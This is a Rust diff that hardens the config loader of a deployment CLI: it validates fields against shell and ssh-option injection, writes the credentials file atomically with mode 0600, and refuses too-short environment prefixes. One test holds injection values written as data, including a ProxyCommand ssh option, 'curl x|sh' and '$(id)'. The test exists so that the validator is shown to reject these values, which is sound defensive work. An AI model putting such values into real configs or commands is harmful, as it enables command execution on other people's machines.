@@ -54,7 +54,7 @@ pub struct EnvConfig {
     /// "direct" (SSH push to an internal box); absent means the LEASE path
     /// (local docker build → registry → fred). Explicit values:
     /// "direct" | "gateway" (server-side build, ADR 008) | "lease".
-    pub transport: Option<String>,
+    pub transport: Option<Transport>,
     /// Which Aoraki remote gets this environment's deploy events
     /// (default: [defaults].remote in the global config, or the sole remote).
     pub remote: Option<String>,
@@ -76,15 +76,23 @@ pub struct EnvConfig {
     pub aliases: Vec<String>,
 }
 
+#[derive(Deserialize, Clone, Copy, PartialEq, Eq, Debug)]
+#[serde(rename_all = "lowercase")]
+pub enum Transport {
+    Direct,
+    Gateway,
+    Lease,
+}
+
 impl EnvConfig {
     pub fn is_gateway(&self) -> bool {
-        self.transport.as_deref() == Some("gateway")
+        self.transport == Some(Transport::Gateway)
     }
     /// The default customer path: explicit `transport = "lease"`, or no
     /// transport AND no server (nothing to ssh to ⇒ it's a lease).
     pub fn is_lease(&self) -> bool {
-        match self.transport.as_deref() {
-            Some("lease") => true,
+        match self.transport {
+            Some(Transport::Lease) => true,
             None => self.server.is_none(),
             _ => false,
         }
@@ -103,6 +111,67 @@ impl EnvConfig {
             .as_deref()
             .ok_or_else(|| anyhow::anyhow!("lease environments have no deploy_script"))
     }
+}
+
+impl RepoConfig {
+    /// Checks serde can't express. Values here end up inside remote shell
+    /// commands (`sudo kubectl -n <namespace>`, the bare-repo path, the
+    /// hook's git config) and as ssh arguments, so a committed aoraki.toml
+    /// must not be able to smuggle shell syntax or ssh options through
+    /// them — a reviewer running `aoraki logs` on a PR checkout would
+    /// execute it.
+    pub fn validate(&self) -> Result<()> {
+        check_word("app.name", &self.app.name)?;
+        for (name, env) in &self.environments {
+            let field = |f: &str| format!("environments.{name}.{f}");
+            check_word(&field("branch"), &env.branch)?;
+            if let Some(s) = &env.server {
+                check_word(&field("server"), s)?;
+            }
+            if let Some(ns) = &env.namespace {
+                check_word(&field("namespace"), ns)?;
+            }
+            if let Some(p) = &env.workdir {
+                check_path(&field("workdir"), p)?;
+            }
+            if let Some(p) = &env.deploy_script {
+                check_path(&field("deploy_script"), p)?;
+            }
+            if env.server.is_none() && env.transport.is_some_and(|t| t != Transport::Lease) {
+                bail!(
+                    "{} needs `server` (it is not a lease environment)",
+                    field("transport")
+                );
+            }
+        }
+        Ok(())
+    }
+}
+
+/// Names, branches, hosts: letters, digits and `-_./@`, not starting with
+/// `-` (which ssh and git would read as an option).
+fn check_word(field: &str, v: &str) -> Result<()> {
+    let ok = !v.is_empty()
+        && !v.starts_with('-')
+        && v.chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '/' | '@'));
+    if !ok {
+        bail!("aoraki.toml: {field} = {v:?} — use letters, digits and - _ . / @ (not starting with -)");
+    }
+    Ok(())
+}
+
+/// File paths on the box: same as a word, plus `~` and `+`; no `..`.
+fn check_path(field: &str, v: &str) -> Result<()> {
+    let ok = !v.is_empty()
+        && !v.starts_with('-')
+        && !v.split('/').any(|seg| seg == "..")
+        && v.chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '/' | '~' | '+'));
+    if !ok {
+        bail!("aoraki.toml: {field} = {v:?} — use a plain path (letters, digits, - _ . / ~ +)");
+    }
+    Ok(())
 }
 
 /// Global `~/.config/aoraki/config.toml`.
@@ -296,7 +365,8 @@ pub fn config_home() -> PathBuf {
 /// is accepted as a fallback at each level so internal repos keep working
 /// until they rename (ADR 011: aoraki.toml is the customer-facing name).
 pub fn find_repo_config() -> Result<(PathBuf, RepoConfig)> {
-    let mut dir = std::env::current_dir()?;
+    let cwd = std::env::current_dir()?;
+    let mut dir = cwd.clone();
     loop {
         let candidate = ["aoraki.toml", "manifest.toml"]
             .iter()
@@ -311,12 +381,62 @@ pub fn find_repo_config() -> Result<(PathBuf, RepoConfig)> {
             if cfg.environments.is_empty() {
                 bail!("{} defines no [environments.*]", candidate.display());
             }
+            cfg.validate()
+                .with_context(|| format!("checking {}", candidate.display()))?;
+            // Found in a parent: say so — running from an app folder that
+            // has no aoraki.toml yet would otherwise act on the parent's app.
+            if dir != cwd {
+                eprintln!("→ using {} (app '{}')", candidate.display(), cfg.app.name);
+            }
             return Ok((dir, cfg));
         }
         if !dir.pop() {
             bail!("no aoraki.toml found in this directory or any parent — run from an app repo, or create one (see `examples/aoraki.toml` in the aoraki-cli repo)");
         }
     }
+}
+
+/// Load config.toml for editing, apply `f`, and save it — written to a
+/// 0600 temp file first and renamed over, so the credentials are never
+/// world-readable (not even briefly) and a crash can't truncate the file.
+/// toml_edit keeps hand-written sections and comments intact.
+fn edit_global(f: impl FnOnce(&mut toml_edit::DocumentMut) -> Result<()>) -> Result<()> {
+    let dir = config_home();
+    std::fs::create_dir_all(&dir).with_context(|| format!("creating {}", dir.display()))?;
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::PermissionsExt;
+        let _ = std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o700));
+    }
+    let path = dir.join("config.toml");
+    let text = if path.exists() {
+        std::fs::read_to_string(&path).with_context(|| format!("reading {}", path.display()))?
+    } else {
+        String::new()
+    };
+    let mut doc: toml_edit::DocumentMut = text
+        .parse()
+        .with_context(|| format!("parsing {}", path.display()))?;
+    f(&mut doc)?;
+
+    let tmp = dir.join("config.toml.tmp");
+    let _ = std::fs::remove_file(&tmp);
+    let mut opts = std::fs::OpenOptions::new();
+    opts.write(true).create_new(true);
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::OpenOptionsExt;
+        opts.mode(0o600);
+    }
+    let write = || -> std::io::Result<()> {
+        use std::io::Write;
+        let mut file = opts.open(&tmp)?;
+        file.write_all(doc.to_string().as_bytes())?;
+        file.sync_all()
+    };
+    write().with_context(|| format!("writing {}", tmp.display()))?;
+    std::fs::rename(&tmp, &path).with_context(|| format!("replacing {}", path.display()))?;
+    Ok(())
 }
 
 /// Write (or clear, with token=None) a remote in config.toml, creating the
@@ -329,132 +449,99 @@ pub fn write_remote(
     org: Option<&str>,
     org_id: Option<&str>,
 ) -> Result<()> {
-    let dir = config_home();
-    std::fs::create_dir_all(&dir).with_context(|| format!("creating {}", dir.display()))?;
-    let path = dir.join("config.toml");
-    let text = if path.exists() {
-        std::fs::read_to_string(&path).with_context(|| format!("reading {}", path.display()))?
-    } else {
-        String::new()
-    };
-    let mut doc: toml_edit::DocumentMut = text
-        .parse()
-        .with_context(|| format!("parsing {}", path.display()))?;
-
-    let remotes = doc
-        .entry("remotes")
-        .or_insert(toml_edit::table())
-        .as_table_mut()
-        .context("[remotes] in config.toml is not a table")?;
-    remotes.set_implicit(true); // render [remotes.<name>], no bare [remotes] header
-    let entry = remotes
-        .entry(name)
-        .or_insert(toml_edit::table())
-        .as_table_mut()
-        .with_context(|| format!("[remotes.{name}] in config.toml is not a table"))?;
-    entry["api_url"] = toml_edit::value(api_url);
-    match token {
-        Some(t) => {
-            entry["token"] = toml_edit::value(t);
-        }
-        None => {
-            entry.remove("token");
-        }
-    }
-    if let Some(o) = org {
-        entry["org"] = toml_edit::value(o);
-    }
-    if let Some(id) = org_id {
-        entry["org_id"] = toml_edit::value(id);
-    }
-
-    // First login pins [defaults].remote so later remotes don't make every
-    // command ask which console it meant.
-    if remotes.len() == 1 {
-        if let Some(defaults) = doc
-            .entry("defaults")
+    edit_global(|doc| {
+        let remotes = doc
+            .entry("remotes")
             .or_insert(toml_edit::table())
             .as_table_mut()
-        {
-            if !defaults.contains_key("remote") {
-                defaults["remote"] = toml_edit::value(name);
+            .context("[remotes] in config.toml is not a table")?;
+        remotes.set_implicit(true); // render [remotes.<name>], no bare [remotes] header
+        let entry = remotes
+            .entry(name)
+            .or_insert(toml_edit::table())
+            .as_table_mut()
+            .with_context(|| format!("[remotes.{name}] in config.toml is not a table"))?;
+        entry["api_url"] = toml_edit::value(api_url);
+        match token {
+            Some(t) => {
+                entry["token"] = toml_edit::value(t);
+            }
+            None => {
+                entry.remove("token");
             }
         }
-    }
+        if let Some(o) = org {
+            entry["org"] = toml_edit::value(o);
+        }
+        if let Some(id) = org_id {
+            entry["org_id"] = toml_edit::value(id);
+        }
 
-    std::fs::write(&path, doc.to_string())
-        .with_context(|| format!("writing {}", path.display()))?;
-    #[cfg(unix)]
-    {
-        use std::os::unix::fs::PermissionsExt;
-        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o600))?;
-    }
-    Ok(())
+        // First login pins [defaults].remote so later remotes don't make every
+        // command ask which console it meant.
+        if remotes.len() == 1 {
+            if let Some(defaults) = doc
+                .entry("defaults")
+                .or_insert(toml_edit::table())
+                .as_table_mut()
+            {
+                if !defaults.contains_key("remote") {
+                    defaults["remote"] = toml_edit::value(name);
+                }
+            }
+        }
+        Ok(())
+    })
 }
 
 /// Rename a remote in config.toml, carrying its url/token and re-pointing
 /// [defaults].remote if it referenced the old name.
 pub fn rename_remote(old: &str, new: &str) -> Result<()> {
-    let path = config_home().join("config.toml");
-    let text =
-        std::fs::read_to_string(&path).with_context(|| format!("reading {}", path.display()))?;
-    let mut doc: toml_edit::DocumentMut = text
-        .parse()
-        .with_context(|| format!("parsing {}", path.display()))?;
-    let remotes = doc
-        .get_mut("remotes")
-        .and_then(|r| r.as_table_mut())
-        .context("no [remotes] in config.toml")?;
-    let entry = remotes.remove(old).context("remote vanished mid-rename")?;
-    remotes.insert(new, entry);
-    if let Some(defaults) = doc.get_mut("defaults").and_then(|d| d.as_table_mut()) {
-        if defaults.get("remote").and_then(|v| v.as_str()) == Some(old) {
-            defaults["remote"] = toml_edit::value(new);
+    edit_global(|doc| {
+        let remotes = doc
+            .get_mut("remotes")
+            .and_then(|r| r.as_table_mut())
+            .context("no [remotes] in config.toml")?;
+        let entry = remotes.remove(old).context("remote vanished mid-rename")?;
+        remotes.insert(new, entry);
+        if let Some(defaults) = doc.get_mut("defaults").and_then(|d| d.as_table_mut()) {
+            if defaults.get("remote").and_then(|v| v.as_str()) == Some(old) {
+                defaults["remote"] = toml_edit::value(new);
+            }
         }
-    }
-    std::fs::write(&path, doc.to_string())
-        .with_context(|| format!("writing {}", path.display()))?;
-    #[cfg(unix)]
-    {
-        use std::os::unix::fs::PermissionsExt;
-        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o600))?;
-    }
-    Ok(())
+        Ok(())
+    })
 }
 
 /// Set [defaults].remote in config.toml (toml_edit keeps comments intact).
 pub fn write_default_remote(name: &str) -> Result<()> {
-    let dir = config_home();
-    std::fs::create_dir_all(&dir).with_context(|| format!("creating {}", dir.display()))?;
-    let path = dir.join("config.toml");
-    let text = if path.exists() {
-        std::fs::read_to_string(&path).with_context(|| format!("reading {}", path.display()))?
-    } else {
-        String::new()
-    };
-    let mut doc: toml_edit::DocumentMut = text
-        .parse()
-        .with_context(|| format!("parsing {}", path.display()))?;
-    let defaults = doc
-        .entry("defaults")
-        .or_insert(toml_edit::table())
-        .as_table_mut()
-        .context("[defaults] in config.toml is not a table")?;
-    defaults["remote"] = toml_edit::value(name);
-    std::fs::write(&path, doc.to_string())
-        .with_context(|| format!("writing {}", path.display()))?;
-    #[cfg(unix)]
-    {
-        use std::os::unix::fs::PermissionsExt;
-        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o600))?;
-    }
-    Ok(())
+    edit_global(|doc| {
+        let defaults = doc
+            .entry("defaults")
+            .or_insert(toml_edit::table())
+            .as_table_mut()
+            .context("[defaults] in config.toml is not a table")?;
+        defaults["remote"] = toml_edit::value(name);
+        Ok(())
+    })
 }
 
 pub fn load_global() -> Result<GlobalConfig> {
     let path = config_home().join("config.toml");
     if !path.exists() {
         return Ok(GlobalConfig::default());
+    }
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::PermissionsExt;
+        if let Ok(meta) = std::fs::metadata(&path) {
+            if meta.permissions().mode() & 0o077 != 0 {
+                eprintln!(
+                    "⚠ {} is readable by other users and holds API keys — chmod 600 it",
+                    path.display()
+                );
+            }
+        }
     }
     let text =
         std::fs::read_to_string(&path).with_context(|| format!("reading {}", path.display()))?;
@@ -484,11 +571,12 @@ pub fn resolve_env_name(
                 return Ok(env_name.clone());
             }
         }
-        // Unique prefix of a real name (prod → production).
+        // Unique prefix of a real name (prod → production), at least 3
+        // characters: a stray `p` or `pr` must not land in production.
         let prefix_matches: Vec<&String> = repo
             .environments
             .keys()
-            .filter(|k| k.starts_with(&name))
+            .filter(|k| name.len() >= 3 && k.starts_with(&name))
             .collect();
         if let [only] = prefix_matches[..] {
             return Ok(only.clone());
@@ -595,6 +683,52 @@ mod tests {
     }
 
     #[test]
+    fn transport_typos_are_rejected_at_parse() {
+        let bad = MINIMAL_ENV.replace(
+            "deploy_script = \"k8s/deploy.sh\"",
+            "deploy_script = \"k8s/deploy.sh\"\ntransport = \"leese\"",
+        );
+        assert!(toml::from_str::<RepoConfig>(&bad).is_err());
+    }
+
+    #[test]
+    fn validate_accepts_ordinary_configs() {
+        repo(MINIMAL_ENV).validate().unwrap();
+        repo(TWO_ENVS).validate().unwrap();
+    }
+
+    #[test]
+    fn validate_rejects_shell_and_ssh_option_smuggling() {
+        for (from, to) in [
+            ("server = \"core2\"", "server = \"-oProxyCommand=sh -c id\""),
+            ("namespace = \"demo\"", "namespace = \"demo; curl x|sh\""),
+            ("branch = \"prod\"", "branch = \"prod'$(id)'\""),
+            (
+                "deploy_script = \"k8s/deploy.sh\"",
+                "deploy_script = \"../../etc/x\"",
+            ),
+            ("name = \"demo\"", "name = \"demo app\""),
+        ] {
+            let cfg = repo(&MINIMAL_ENV.replace(from, to));
+            assert!(cfg.validate().is_err(), "accepted {to}");
+        }
+    }
+
+    #[test]
+    fn validate_rejects_direct_transport_without_server() {
+        let cfg = repo(
+            r#"
+            [app]
+            name = "demo"
+            [environments.production]
+            branch = "main"
+            transport = "direct"
+            "#,
+        );
+        assert!(cfg.validate().is_err());
+    }
+
+    #[test]
     fn unknown_field_in_env_is_rejected() {
         let bad = MINIMAL_ENV.replace("namespace", "namspace");
         assert!(toml::from_str::<RepoConfig>(&bad).is_err());
@@ -655,20 +789,30 @@ mod tests {
     #[test]
     fn unique_prefix_resolves() {
         assert_eq!(resolve(Some("prod"), None, TWO_ENVS).unwrap(), "production");
-        assert_eq!(resolve(Some("st"), None, TWO_ENVS).unwrap(), "staging");
+        assert_eq!(resolve(Some("sta"), None, TWO_ENVS).unwrap(), "staging");
+        assert!(
+            resolve(Some("pr"), None, TWO_ENVS).is_err(),
+            "too short to guess production"
+        );
     }
 
     #[test]
     fn ambiguous_prefix_errors() {
         let src = TWO_ENVS.replace("environments.production", "environments.stable");
-        let err = resolve(Some("st"), None, &src).err().unwrap().to_string();
+        let err = resolve(Some("sta"), None, &src).err().unwrap().to_string();
         assert!(err.contains("not in aoraki.toml"), "got: {err}");
     }
 
     #[test]
     fn unknown_env_error_lists_available() {
-        let err = resolve(Some("nope"), None, TWO_ENVS).err().unwrap().to_string();
-        assert!(err.contains("staging") && err.contains("production"), "got: {err}");
+        let err = resolve(Some("nope"), None, TWO_ENVS)
+            .err()
+            .unwrap()
+            .to_string();
+        assert!(
+            err.contains("staging") && err.contains("production"),
+            "got: {err}"
+        );
     }
 
     #[test]
@@ -687,7 +831,10 @@ mod tests {
 
     #[test]
     fn unknown_branch_with_two_envs_errors() {
-        let err = resolve(None, Some("feature-x"), TWO_ENVS).err().unwrap().to_string();
+        let err = resolve(None, Some("feature-x"), TWO_ENVS)
+            .err()
+            .unwrap()
+            .to_string();
         assert!(err.contains("specify an environment"), "got: {err}");
     }
 
@@ -700,7 +847,10 @@ mod tests {
 
     #[test]
     fn app_default_env_breaks_the_tie() {
-        let src = TWO_ENVS.replace("name = \"demo\"", "name = \"demo\"\ndefault_env = \"staging\"");
+        let src = TWO_ENVS.replace(
+            "name = \"demo\"",
+            "name = \"demo\"\ndefault_env = \"staging\"",
+        );
         assert_eq!(resolve(None, None, &src).unwrap(), "staging");
     }
 
@@ -745,13 +895,20 @@ mod tests {
     #[test]
     fn org_id_pin_resolves() {
         let g = global(REMOTES);
-        assert_eq!(g.resolve_remote(Some("org_bbbbbbbbbb")).unwrap().0, "personal");
+        assert_eq!(
+            g.resolve_remote(Some("org_bbbbbbbbbb")).unwrap().0,
+            "personal"
+        );
     }
 
     #[test]
     fn unknown_org_id_errors_with_login_hint() {
         let g = global(REMOTES);
-        let err = g.resolve_remote(Some("org_zzzzzzzzzz")).err().unwrap().to_string();
+        let err = g
+            .resolve_remote(Some("org_zzzzzzzzzz"))
+            .err()
+            .unwrap()
+            .to_string();
         assert!(err.contains("aoraki login"), "got: {err}");
     }
 
@@ -760,7 +917,8 @@ mod tests {
         let src = REMOTES.replace("org_bbbbbbbbbb", "org_aaaaaaaaaa");
         let err = global(&src)
             .resolve_remote(Some("org_aaaaaaaaaa"))
-            .err().unwrap()
+            .err()
+            .unwrap()
             .to_string();
         assert!(err.contains("several consoles"), "got: {err}");
     }
@@ -779,7 +937,8 @@ mod tests {
         let g = global(REMOTES);
         let err = g
             .resolve_remote(Some("https://other.example/api/v1"))
-            .err().unwrap()
+            .err()
+            .unwrap()
             .to_string();
         assert!(err.contains("aoraki login --url"), "got: {err}");
     }
@@ -792,7 +951,8 @@ mod tests {
         );
         let err = global(&src)
             .resolve_remote(Some("https://aoraki.cloud/api/v1"))
-            .err().unwrap()
+            .err()
+            .unwrap()
             .to_string();
         assert!(err.contains("several orgs"), "got: {err}");
     }
@@ -800,7 +960,10 @@ mod tests {
     #[test]
     fn org_name_matches_case_and_punctuation_insensitively() {
         let g = global(REMOTES);
-        assert_eq!(g.resolve_remote(Some("sarson-funds")).unwrap().0, "personal");
+        assert_eq!(
+            g.resolve_remote(Some("sarson-funds")).unwrap().0,
+            "personal"
+        );
         assert_eq!(g.resolve_remote(Some("SARSONFUNDS")).unwrap().0, "personal");
     }
 
@@ -808,7 +971,10 @@ mod tests {
     fn unmatched_name_lists_configured_remotes() {
         let g = global(REMOTES);
         let err = g.resolve_remote(Some("nope")).err().unwrap().to_string();
-        assert!(err.contains("company") && err.contains("personal"), "got: {err}");
+        assert!(
+            err.contains("company") && err.contains("personal"),
+            "got: {err}"
+        );
     }
 
     #[test]
@@ -826,21 +992,27 @@ mod tests {
 
     #[test]
     fn sole_remote_needs_no_selection() {
-        let g = global(
-            "[remotes.only]\napi_url = \"https://aoraki.cloud/api/v1\"\n",
-        );
+        let g = global("[remotes.only]\napi_url = \"https://aoraki.cloud/api/v1\"\n");
         assert_eq!(g.resolve_remote(None).unwrap().0, "only");
     }
 
     #[test]
     fn zero_remotes_errors_with_login_hint() {
-        let err = GlobalConfig::default().resolve_remote(None).err().unwrap().to_string();
+        let err = GlobalConfig::default()
+            .resolve_remote(None)
+            .err()
+            .unwrap()
+            .to_string();
         assert!(err.contains("aoraki login"), "got: {err}");
     }
 
     #[test]
     fn multiple_remotes_without_default_must_be_named() {
-        let err = global(REMOTES).resolve_remote(None).err().unwrap().to_string();
+        let err = global(REMOTES)
+            .resolve_remote(None)
+            .err()
+            .unwrap()
+            .to_string();
         assert!(err.contains("[defaults].remote"), "got: {err}");
     }
 
@@ -860,7 +1032,10 @@ mod tests {
 
     #[test]
     fn unlisted_alias_passes_through_to_ssh_config() {
-        assert_eq!(resolve_target(&GlobalConfig::default(), "deploymfx"), "deploymfx");
+        assert_eq!(
+            resolve_target(&GlobalConfig::default(), "deploymfx"),
+            "deploymfx"
+        );
     }
 
     // ── find_repo_config (cwd-sensitive: serialized) ──────────────────
@@ -879,7 +1054,11 @@ mod tests {
     #[test]
     fn aoraki_toml_is_preferred_over_legacy_manifest_toml() {
         let tmp = tempfile::tempdir().unwrap();
-        std::fs::write(tmp.path().join("manifest.toml"), MINIMAL_ENV.replace("demo", "old")).unwrap();
+        std::fs::write(
+            tmp.path().join("manifest.toml"),
+            MINIMAL_ENV.replace("demo", "old"),
+        )
+        .unwrap();
         std::fs::write(tmp.path().join("aoraki.toml"), MINIMAL_ENV).unwrap();
         let cfg = in_dir(tmp.path(), || find_repo_config().unwrap().1);
         assert_eq!(cfg.app.name, "demo");
@@ -902,7 +1081,11 @@ mod tests {
     #[test]
     fn config_with_no_environments_is_rejected() {
         let tmp = tempfile::tempdir().unwrap();
-        std::fs::write(tmp.path().join("aoraki.toml"), "[app]\nname = \"demo\"\n[environments]\n").unwrap();
+        std::fs::write(
+            tmp.path().join("aoraki.toml"),
+            "[app]\nname = \"demo\"\n[environments]\n",
+        )
+        .unwrap();
         let err = in_dir(tmp.path(), || find_repo_config().err().unwrap().to_string());
         assert!(err.contains("no [environments"), "got: {err}");
     }
